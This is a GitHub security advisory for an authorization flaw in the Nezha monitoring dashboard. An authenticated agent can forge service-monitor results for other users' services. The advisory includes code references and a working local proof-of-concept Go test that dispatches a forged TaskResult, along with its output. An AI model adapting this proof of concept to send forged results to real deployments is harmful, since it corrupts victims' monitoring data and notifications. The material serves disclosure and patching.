# [H] Nezha's authenticated agents can forge service-monitor results for other users' services

## Summary
Severity: High
Advisory: GHSA-4g6j-g789-rghm
CVE: CVE-2026-48119
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-06-01
Source: https://github.com/advisories/GHSA-4g6j-g789-rghm
Type: github-advisory

## Affected
- Go: `github.com/nezhahq/nezha` — affected >=0.20.0 <1.14.15-0.20260521020202-02129f16fb15
- Go: `github.com/nezhahq/nezha` — affected >=2.0.0 <2.0.12

## Details
#### Summary

Nezha accepts service-monitor `TaskResult` messages from an authenticated agent based only on whether the reported service ID exists. The dashboard authenticates the agent and derives the reporter server ID from the gRPC stream, but the service-monitor result worker does not verify that the reporter server was selected for that service, belongs to the service owner, or was actually assigned that monitoring task.

A low-privilege user with a valid agent secret and one registered agent can therefore submit forged monitoring results for another user's service ID. This allows cross-tenant corruption of service-monitor history/current state, and can influence victim-owned service notifications with attacker-controlled result text.

#### Details

The agent task stream accepts inbound `TaskResult` messages after authenticating agent metadata:

- `service/rpc/auth.go:23-60` validates `client_secret` and `client_uuid`.
- `service/rpc/auth.go:63-75` registers an unknown valid UUID as a server for the authenticated secret owner.
- `service/rpc/nezha.go:40-48` authenticates the `RequestTask` stream and binds it to `clientID`.
- `service/rpc/nezha.go:50-56` receives agent-controlled `TaskResult` messages.
- `proto/nezha.proto:60-65` defines attacker-controlled `TaskResult.id`, `type`, `delay`, `data`, and `successful`.

For service-monitor task types, the result is dispatched directly to the service sentinel using the authenticated server ID as reporter:

- `service/rpc/nezha.go:85-90` dispatches service-monitor result types to `ServiceSentinelShared.Dispatch` with `Reporter: clientID`.
- `model/service.go:131-140` treats non-operational task types as service-monitor result types.

The vulnerable authorization gap is in the service-monitor worker:

- `service/singleton/servicesentinel.go:475-483` checks only that `r.Data.GetId()` resolves to an existing service.
- It does not check that `r.Reporter` is covered by that service.
- It does not check that the service owner owns the reporter server.
- It does not check that the dashboard actually sent this service-monitor task to that agent.

The forged result is then recorded and used for service status processing:

- `service/singleton/servicesentinel.go:487-528` records ping service history keyed by `ServiceID` and `Reporter`.
- `service/singleton/servicesentinel.go:543-624` updates today's status, current service state, and state-change handling.
- `service/singleton/servicesentinel.go:723-739` can send victim-owned notifications containing `mh.Data`, which is attacker-controlled result text.

This is inconsistent with outbound service-monitor dispatch, which does enforce service coverage and ownership before sending tasks to agents:

- `cmd/dashboard/rpc/rpc.go:84-109` sends service-monitor tasks only to selected/non-skipped servers according to `Service.Cover` and `SkipServers`.
- `cmd/dashboard/rpc/rpc.go:96-107` calls `canSendTaskToServer` before sending.
- `cmd/dashboard/rpc/rpc.go:182-193` permits outbound dispatch only when the service owner owns the server, or when the service owner is an admin.
- `cmd/dashboard/controller/service.go:478-480` and `cmd/dashboard/controller/service.go:590-607` validate selected servers, trigger tasks, and notification groups during service creation/update.

The inbound result path should mirror these authorization checks before accepting a result.

#### PoC

The following local PoC creates a temporary Go test file in `service/singleton`, uses an in-memory SQLite database, does not start the dashboard listener, does not contact public systems, and removes the temporary test file on exit.

The PoC proves the vulnerable processing path by creating:

- victim user ID `100`;
- victim service ID `10`;
- victim server ID `1`;
- attacker user ID `200`;
- attacker reporter server ID `2`.

The victim service is configured with `ServiceCoverIgnoreAll` and only server `1` enabled. Therefore, the dashboard's outbound service-monitor dispatch logic would not send this task to attacker server `2`.

The forged inbound result from reporter `2` is nevertheless accepted and creates a `ServiceHistory` row for victim service `10`.

Environment tested:

- Repository: `https://github.com/nezhahq/nezha.git`
- Commit: `79c06d0f95ad4e0eedc01a72fc0c54f4666cb0bf`
- OS: Linux
- Test date: 2026-05-19

From a clean checkout of the tested commit, run:

```sh
set -e
pocfile=$(mktemp service/singleton/service_spoof_poc_XXXX_test.go)
cleanup() {
  rm -f "$pocfile"
}
trap cleanup EXIT

cat > "$pocfile" <<'EOF'
package singleton

import (
	"testing"
	"time"

	"github.com/patrickmn/go-cache"
	"github.com/robfig/cron/v3"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/nezhahq/nezha/model"
	pb "github.com/nezhahq/nezha/proto"
)

func replaceServerSharedForSpoofPoC(t *testing.T, servers ...*model.Server) {
	t.Helper()

	original := ServerShared
	serverClass := &ServerClass{
		class: class[uint64, *model.Server]{
			list: make(map[uint64]*model.Server),
		},
		uuidToID: make(map[string]uint64),
	}
	for _, server := range servers {
		serverClass.list[server.ID] = server
	}
	ServerShared = serverClass
	t.Cleanup(func() { ServerShared = original })
}

func TestForgedAgentServiceResultCreatesHistoryForUnassignedService(t *testing.T) {
	originalDB := DB
	originalConf := Conf
	originalCache := Cache
	originalCronShared := CronShared
	originalServerShared := ServerShared
	originalServiceSentinelShared := ServiceSentinelShared
	originalNotificationShared := NotificationShared
	originalTSDB := TSDBShared
	originalLoc := Loc

	t.Cleanup(func() {
		DB = originalDB
		Conf = originalConf
		Cache = originalCache
		CronShared = originalCronShared
		ServerShared = originalServerShared
		ServiceSentinelShared = originalServiceSentinelShared
		NotificationShared = originalNotificationShared
		TSDBShared = originalTSDB
		Loc = originalLoc
	})

	db, err := gorm.Open(sqlite.Open("file::memory:?cache=shared"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	DB = db

	if err := DB.AutoMigrate(
		model.Server{},
		model.Service{},
		model.ServiceHistory{},
		model.Notification{},
		model.NotificationGroup{},
		model.NotificationGroupNotification{},
	); err != nil {
		t.Fatal(err)
	}

	Conf = &ConfigClass{Config: &model.Config{AvgPingCount: 1}}
	Cache = cache.New(time.Minute, time.Minute)
	CronShared = &CronClass{
		Cron:  cron.New(cron.WithSeconds()),
		class: class[uint64, *model.Cron]{list: map[uint64]*model.Cron{}},
	}
	NotificationShared = &NotificationClass{
		class:         class[uint64, *model.Notification]{list: map[uint64]*model.Notification{}},
		groupToIDList: map[uint64]map[uint64]*model.Notification{},
		idToGroupList: map[uint64]map[uint64]struct{}{},
		groupList:     map[uint64]string{},
	}

	replaceServerSharedForSpoofPoC(t,
		&model.Server{Common: model.Common{ID: 1, UserID: 100}, Name: "victim-server"},
		&model.Server{Common: model.Common{ID: 2, UserID: 200}, Name: "attacker-agent"},
	)

	Loc = time.UTC

	bus := make(chan *model.Service, 1)
	ss, err := NewServiceSentinel(bus)
	if err != nil {
		t.Fatal(err)
	}
	ServiceSentinelShared = ss

	victimService := &model.Service{
		Common:      model.Common{ID: 10, UserID: 100},
		Name:        "victim-private-service",
		Type:        model.TaskTypeTCPPing,
		Target:      "example.invalid:443",
		Duration:    3600,
		Cover:       model.ServiceCoverIgnoreAll,
		SkipServers: map[uint64]bool{1: true},
	}
	if err := DB.Create(victimService).Error; err != nil {
		t.Fatal(err)
	}
	if err := ss.Update(victimService); err != nil {
		t.Fatal(err)
	}

	ss.Dispatch(ReportData{
		Reporter: 2,
		Data: &pb.TaskResult{
			Id:         10,
			Type:       model.TaskTypeTCPPing,
			Delay:      12,
			Data:       "forged result from unauthorized agent",
			Successful: true,
		},
	})

	deadline := time.After(2 * time.Second)
	for {
		var count int64
		if err := DB.Model(&model.ServiceHistory{}).
			Where("service_id = ? AND server_id = ?", 10, 2).
			Count(&count).Error; err != nil {
			t.Fatal(err)
		}

		if count > 0 {
			return
		}

		select {
		case <-deadline:
			t.Fatalf("expected forged history row for service 10 from unauthorized reporter 2")
		default:
			time.Sleep(10 * time.Millisecond)
		}
	}
}
EOF

go test ./service/singleton -run TestForgedAgentServiceResultCreatesHistoryForUnassignedService -count=1 -v
```

Expected vulnerable output:

```text
=== RUN   TestForgedAgentServiceResultCreatesHistoryForUnassignedService
--- PASS: TestForgedAgentServiceResultCreatesHistoryForUnassignedService
PASS
ok  	github.com/nezhahq/nezha/service/singleton
```

Observed output in my local test environment:

```text
=== RUN   TestForgedAgentServiceResultCreatesHistoryForUnassignedService
--- PASS: TestForgedAgentServiceResultCreatesHistoryForUnassignedService (0.01s)
PASS
ok  	github.com/nezhahq/nezha/service/singleton	0.020s
```

The test passes because a forged result from reporter server `2` creates a service-history row for victim service `10`, even though service `10` only covers victim server `1`.

A fixed version should reject or ignore this forged result. After a fix, the current PoC should fail at the assertion waiting for a `ServiceHistory` row unless the test is changed to assert that `count == 0`.

Note: this is a local processing-path PoC. It directly exercises the same service sentinel worker that the authenticated gRPC `RequestTask` path dispatches to. It does not open a network gRPC connection, send real notifications, or execute commands.

#### Impact

A low-privilege Nezha user with a valid agent secret can forge service-monitor results for services outside their ownership boundary.

Confirmed impact:

- Cross-tenant service-monitor integrity violation.
- False service history entries for victim-owned services.
- Poisoned service availability/current-state data.

Likely impact through the same processing path:

- Victim-owned service notifications can be triggered with attacker-controlled result text.
- Monitoring reliability can be degraded by false up/down/latency results.

This does not require dashboard administrator privileges. The attacker only needs a normal account/agent secret and one registered agent/server.

## References
- https://github.com/nezhahq/nezha/security/advisories/GHSA-4g6j-g789-rghm
- https://nvd.nist.gov/vuln/detail/CVE-2026-48119
- https://github.com/nezhahq/nezha/commit/02129f16fb1572ef57c7e8dd7d03f84d39b8b586
- https://github.com/nezhahq/nezha
